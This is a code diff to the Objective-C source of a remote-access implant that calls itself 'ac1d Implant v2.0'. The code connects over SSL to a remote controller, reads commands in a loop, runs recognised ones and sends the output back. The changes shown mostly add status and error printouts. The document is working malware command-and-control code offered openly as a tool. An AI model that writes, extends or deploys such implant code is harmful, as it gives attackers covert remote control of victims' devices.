@@ -74,21 +74,28 @@ void sendString(NSString *string) {
 }
 
 void interactWithServer(NSString *remoteHost, int remotePort) {
+    printf("[+] Interactive connection spawned!\n");
     ac1d *ac1d_base = [[ac1d alloc] init];
     ac1d_base->client_ssl = client_ssl;
     
     char buffer[2048] = "";
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
         NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
-        
-        if ([commands containsObject:args[0]]) {
-            sendString([ac1d_base sendCommand:args]);
+        printf("[+] Got command from %s:%d!\n", [remoteHost UTF8String], remotePort);
+        printf("[*] Executing %s...\n", [args[0] UTF8String]);
+        if ([commands containsObject:args[0]]) sendString([ac1d_base sendCommand:args]);
+        else {
+            printf("[-] Unrecognized command!\n");
+            sendString(@"error");
         }
         memset(buffer, '\0', 2048);
     }
 }
 
 void connectToServer(NSString *remoteHost, int remotePort) {
+    printf("[i] ac1d Implant v2.0\n");
+    printf("[i] Copyright (c) 2020 Ivan Nikolsky\n");
+    printf("[*] Loading ac1d SSL handler...\n");
     SSL_load_error_strings();
     SSL_library_init();
     OpenSSL_add_all_algorithms();
@@ -97,22 +104,25 @@ void connectToServer(NSString *remoteHost, int remotePort) {
     serverAddress.sin_family = AF_INET;
     inet_aton([remoteHost UTF8String], &serverAddress.sin_addr);
     serverAddress.sin_port = htons(remotePort);
+    printf("[+] ac1d SSL handler loaded!\n");
+    printf("[*] Connecting to %s:%d...\n", [remoteHost UTF8String], remotePort);
     if (connect(sockfd, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
-        printf("error");
+        printf("[-] Failed to connect!\n");
         return;
-    }
+    } else printf("[+] Successfully connected!\n");
     client_ssl = SSL_new(ssl_client_ctx);
     if(!client_ssl) {
-        printf("error");
+        printf("[-] Failed to get SSL client!\n");
         return;
     }
     SSL_set_fd(client_ssl, sockfd);
     if(SSL_connect(client_ssl) != 1) {
-        printf("error");
+        printf("[-] Failed to handshake with SSL client!\n");
         return;
     }
-    
+    printf("[*] Spwaning interactive connection...\n");
     interactWithServer(remoteHost, remotePort);
+    printf("[-] Connection closed!\n");
 }
 
 void showHelpMessage() {
